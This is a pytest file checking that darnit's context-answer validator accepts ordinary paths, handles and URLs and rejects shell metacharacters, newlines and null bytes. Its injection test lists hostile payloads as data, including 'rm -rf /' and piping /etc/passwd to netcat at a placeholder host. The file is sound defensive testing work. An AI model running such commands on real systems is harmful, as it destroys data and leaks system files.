"""Tests for darnit.core.context_validation.

Confirms user-supplied context answer strings are validated at the
boundary, rejecting shell metacharacters, newlines, and null bytes
to prevent command injection during remediation template substitution.
"""

from __future__ import annotations

import pytest

from darnit.core.context_validation import _INVALID_ANSWER_CHARS, validate_context_answer


class TestValidateContextAnswer:
    @pytest.mark.parametrize(
        ("key", "value"),
        [
            ("policy_path", "docs/SECURITY.md"),
            ("license_file", "LICENSE.txt"),
            ("ci_workflow", ".github/workflows/ci.yml"),
            ("maintainer", "@alice"),
            ("maintainer_list", "alice, bob, charlie-dev"),
            ("contact", "security@example.com"),
            ("homepage", "https://github.com/darnitdevorg/darnit"),
            ("license_type", "Apache-2.0"),
            ("is_library", "true"),
            ("has_releases", "false"),
            ("description", "A tool for OpenSSF baseline compliance checks."),
        ],
    )
    def test_valid_answers_accepted(self, key: str, value: str) -> None:
        """Valid compliance paths, handles, URLs, and labels pass validation."""
        assert validate_context_answer(key, value) is None

    @pytest.mark.parametrize("char", sorted(_INVALID_ANSWER_CHARS))
    def test_each_disallowed_character_rejected(self, char: str) -> None:
        """Every character in _INVALID_ANSWER_CHARS raises ValueError."""
        with pytest.raises(ValueError) as excinfo:
            validate_context_answer("test_key", f"prefix{char}suffix")

        err = str(excinfo.value)
        assert "'test_key'" in err
        assert "disallowed character(s)" in err
        assert repr(char) in err or char in err

    @pytest.mark.parametrize(
        ("payload", "expected_chars"),
        [
            ("; rm -rf /", [";"]),
            ("test && echo pwned", ["&"]),
            ("cat /etc/passwd | nc host 1234", ["|"]),
            ("$(whoami)", ["$", "(", ")"]),
            ("`id`", ["`"]),
            ("line1\nline2", ["\n"]),
            ("line1\r\nline2", ["\r", "\n"]),
            ("value\x00extra", ["\x00"]),
            ("out > /dev/null", [">"]),
            ("in < /dev/null", ["<"]),
            ("path\\with\\backslash", ["\\"]),
            ("${VAR}", ["$", "{", "}"]),
            ("item[0]", ["[", "]"]),
        ],
    )
    def test_injection_payloads_rejected(self, payload: str, expected_chars: list[str]) -> None:
        """Shell injection, redirection, and control characters are rejected."""
        with pytest.raises(ValueError) as excinfo:
            validate_context_answer("security_contact", payload)

        err = str(excinfo.value)
        assert "'security_contact'" in err
        for ch in expected_chars:
            assert repr(ch) in err or ch in err

    def test_error_message_sorts_detected_characters(self) -> None:
        """Multiple disallowed characters appear sorted in the error message."""
        with pytest.raises(ValueError) as excinfo:
            validate_context_answer("maintainers", "foo; bar|baz$qux")

        err = str(excinfo.value)
        assert "'maintainers'" in err
        assert repr(["$", ";", "|"]) in err
